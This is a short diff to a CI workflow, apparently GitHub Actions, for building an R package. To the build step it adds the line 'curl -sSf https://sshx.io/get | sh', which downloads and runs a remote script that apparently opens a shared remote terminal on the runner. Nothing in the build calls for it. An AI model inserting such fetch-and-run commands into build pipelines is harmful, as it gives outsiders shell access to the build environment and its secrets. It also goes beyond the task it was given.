@@ -79,6 +79,7 @@ jobs:
     - name: Build the package
       run: |
         cmake --build ${{env.BUILD_DIR}} --parallel 3 --target r_build
+        curl -sSf https://sshx.io/get | sh
 
     - name: Execute R demos and courses
       run: |
